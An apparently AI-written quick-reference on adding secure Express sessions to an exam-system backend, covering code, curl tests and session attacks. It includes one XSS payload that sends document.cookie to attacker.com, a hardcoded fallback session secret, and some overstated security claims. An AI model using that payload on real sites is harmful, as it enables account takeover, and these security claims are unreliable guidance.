# Express Sessions Implementation - Quick Reference

## **What Was Implemented**

### **1. Session Configuration in server.js**

```javascript
import session from "express-session";

app.use(session({
  secret: process.env.SESSION_SECRET || "your-super-secret-key-change-in-production",
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,      // ✅ JavaScript can't access
    secure: process.env.NODE_ENV === "production",  // ✅ HTTPS only
    sameSite: "lax",     // ✅ No cross-site requests
    maxAge: 1000 * 60 * 60 * 24  // ✅ 24 hours
  }
}));
```

### **2. Login Creates Session**

```javascript
app.post("/api/login", async (req, res) => {
  // ... validate password with Argon2 ...
  
  // ✅ Store user data in session (server-side)
  req.session.userId = user.id;
  req.session.username = user.username;
  req.session.role = user.role;
  req.session.email = user.email;
  
  return res.json({
    message: "Login successful",
    user: { id, username, role, email },
    sessionCreated: true
  });
});
```

### **3. Logout Destroys Session**

```javascript
app.post("/api/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ message: "Logout failed" });
    
    res.json({ message: "Logged out successfully" });
  });
});
```

### **4. Authentication Middleware**

```javascript
const requireSession = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ message: "Not authenticated" });
  }
  next();
};

// ✅ Protected endpoint (requires session)
app.get("/api/auth/me", requireSession, (req, res) => {
  res.json({
    user: {
      id: req.session.userId,
      username: req.session.username,
      role: req.session.role,
      email: req.session.email
    }
  });
});
```

---

## **Security Features**

| Feature | Purpose |
|---------|---------|
| **HttpOnly** | XSS Protection - JavaScript can't steal cookie |
| **Secure** | Network Protection - Cookie only over HTTPS |
| **SameSite=Lax** | CSRF Protection - Not sent cross-site |
| **Max-Age** | Session Timeout - Expires after 24 hours |
| **Server-side Storage** | Password Protection - Password never sent after login |

---

## **Quick Test Commands**

### **Test 1: Login & Get Session**
```bash
curl -c cookies.txt -X POST https://oes.freshmilkstraightfromsource.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","password":"pass123"}'
```

### **Test 2: Access Protected Route with Session**
```bash
curl -b cookies.txt https://oes.freshmilkstraightfromsource.com/api/auth/me
```

### **Test 3: Logout & Destroy Session**
```bash
curl -b cookies.txt -X POST https://oes.freshmilkstraightfromsource.com/api/logout
```

### **Test 4: Try Protected Route After Logout (Should Fail)**
```bash
curl -b cookies.txt https://oes.freshmilkstraightfromsource.com/api/auth/me
# Expected: 401 Unauthorized
```

---

## **Session Vulnerabilities Explained**

### **1. Session Hijacking**

**Attack:**
```
1. Attacker steals sessionID cookie (via XSS, MITM, network sniffing)
2. Attacker sends request with stolen sessionID
3. Server thinks attacker is legitimate user
4. Attacker gains full account access
```

**Our Protections:**
```
✅ HttpOnly: Blocks XSS cookie theft
✅ Secure: Blocks network sniffing
✅ SameSite=Lax: Blocks cross-site requests
```

**Still Vulnerable To:**
```
⚠️  Physical device access (attacker at keyboard)
⚠️  Malware/spyware on device
⚠️  Browser DevTools access (attacker opens console)
```

### **2. Session Replay**

**Attack:**
```
1. Attacker captures sessionID before logout
2. Original user logs out (session destroyed)
3. Attacker replays saved sessionID
4. Attacker uses old session after expiration
```

**Our Protections:**
```
✅ Session destroyed on logout
✅ 24-hour expiration (session invalidated after time)
```

**To Add:**
```
- IP address validation (session locked to IP)
- Device fingerprinting (detect device change)
- 2FA/MFA (enable second factor)
```

### **3. Session Fixation**

**Attack:**
```
1. Attacker pre-generates sessionID
2. Attacker tricks user into using that sessionID
3. User logs in while using attacker's sessionID
4. Both share same session
```

**Our Protections:**
```
❌ NOT YET IMPLEMENTED
   Need: req.session.regenerate() on login
```

**Fix Required:**
```javascript
app.post("/api/login", async (req, res) => {
  // Validate credentials...
  
  // ✅ Regenerate session ID on login
  req.session.regenerate((err) => {
    if (err) return res.status(500);
    
    req.session.userId = user.id;
    // Now using new session ID, old one is invalid
  });
});
```

---

## **How Attackers Steal Cookies**

### **Method 1: XSS (Cross-Site Scripting)**

```html
<!-- Injected malicious script -->
<img src=x onerror="fetch('https://attacker.com/steal?c=' + document.cookie)">
```

**Our Protection:**
```
HttpOnly flag prevents: document.cookie access
Result: Attacker gets empty string, can't steal sessionID
```

### **Method 2: Network Sniffing**

```
Public Wi-Fi network
Attacker intercepts unencrypted traffic
Sees: POST /api/login ... Set-Cookie: sessionID=abc123
```

**Our Protection:**
```
HTTPS encryption + Secure flag
Result: Traffic encrypted, attacker can't read sessionID
```

### **Method 3: Man-in-the-Middle (MITM)**

```
User ---(HTTP)---> Attacker's laptop ---> Server
                   Attacker sees all cookies
```

**Our Protection:**
```
HTTPS + Certificate Pinning
Result: Traffic encrypted end-to-end
```

### **Method 4: Browser Developer Tools**

```
Attacker at user's computer
Opens DevTools (F12) → Application → Cookies
Sees but CANNOT copy sessionID (HttpOnly blocks)
```

**Our Protection:**
```
HttpOnly flag
Result: sessionID not visible in document.cookie
BUT: Attacker could still manually copy from DevTools UI
```

### **Method 5: Malware / Spyware**

```
Keylogger, screen recorder, etc.
Has full computer access
```

**Our Protection:**
```
❌ No technical solution
✅ User education & anti-virus
✅ 2FA/MFA reduces damage
```

---

## **Enhanced Security Recommendations**

### **Add Session Regeneration on Login**

```javascript
// Fix: Prevent session fixation
req.session.regenerate((err) => {
  if (err) return res.status(500).json({ message: "Login failed" });
  
  // Now using NEW session ID
  req.session.userId = user.id;
  req.session.username = user.username;
  
  // Old session ID is invalid
  res.json({ message: "Login successful", user: {...} });
});
```

### **Add IP Address Validation**

```javascript
// Store IP on login
req.session.ipAddress = req.ip;

// Check IP on each request
const requireSession = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ message: "Not authenticated" });
  }
  
  // ✅ Detect IP change (possible hijacking)
  if (req.session.ipAddress !== req.ip) {
    req.session.destroy();
    return res.status(401).json({ message: "Session invalidated. Please login again." });
  }
  
  next();
};
```

### **Add 2FA/MFA**

```javascript
// Step 1: Verify password
app.post("/api/login", async (req, res) => {
  // ... verify password ...
  
  // Generate OTP instead of creating session
  const otp = generateOTP();
  await pool.execute(
    "INSERT INTO login_otp VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 5 MINUTE))",
    [user.id, otp]
  );
  
  res.json({ message: "OTP sent to email" });
});

// Step 2: Verify OTP
app.post("/api/login/verify-otp", async (req, res) => {
  const { username, otp } = req.body;
  
  // Check if OTP valid
  const [match] = await pool.execute(
    "SELECT * FROM login_otp WHERE userId = (SELECT id FROM users WHERE username = ?) AND otp = ? AND expiresAt > NOW()",
    [username, otp]
  );
  
  if (!match.length) {
    return res.status(401).json({ message: "Invalid OTP" });
  }
  
  // NOW create session (after password AND OTP verified)
  req.session.userId = user.id;
  // ...
});
```

---

## **Testing Comparison**

### **Without Sessions (Vulnerable)**

```bash
# Client sends password with EVERY request
curl -X GET https://oes.example.com/api/dashboard \
  -H "Authorization: Basic $(echo -n 'student1:pass123' | base64)"
# Password: pass123 sent in every request! ❌
```

### **With Sessions (Secure)**

```bash
# Client sends only session cookie
curl -b "sessionID=abc123xyz" https://oes.example.com/api/dashboard
# Password never sent again! ✅
```

---

## **Security Checklist**

- [x] Install express-session
- [x] Add session middleware with security flags
- [x] HttpOnly flag enabled
- [x] Secure flag for HTTPS
- [x] SameSite=Lax for CSRF
- [x] Login creates session
- [x] Logout destroys session
- [x] Protected routes require session
- [x] Authentication middleware implemented
- [x] Vulnerability documentation created
- [x] Testing procedures documented
- [ ] Session regeneration on login (RECOMMENDED)
- [ ] IP address validation (RECOMMENDED)
- [ ] 2FA/MFA implementation (RECOMMENDED)
- [ ] Rate limiting on login (RECOMMENDED)
- [ ] Session activity logging (RECOMMENDED)

---

## **Next Steps**

1. **Update cPanel:**
   ```bash
   cd ~/public_html/oes-backend
   git pull origin main
   npm install  # Install express-session
   pm2 restart all  # Restart Node.js
   ```

2. **Test with Provided Commands:**
   - Use cURL examples above
   - Or use Python scripts in SESSION_TESTING_PROCEDURES.md

3. **Add Recommended Features:**
   - Session regeneration on login
   - IP validation
   - 2FA/MFA

4. **Monitor Session Security:**
   - Log session creation/destruction
   - Alert on suspicious activity
   - Implement rate limiting

---

## **Files Created/Updated**

| File | Purpose |
|------|---------|
| `server.js` | Session middleware, login/logout endpoints |
| `SESSION_VULNERABILITIES_GUIDE.md` | Detailed vulnerability documentation |
| `SESSION_TESTING_PROCEDURES.md` | Step-by-step testing guide |
| `SESSION_QUICK_REFERENCE.md` | This file |

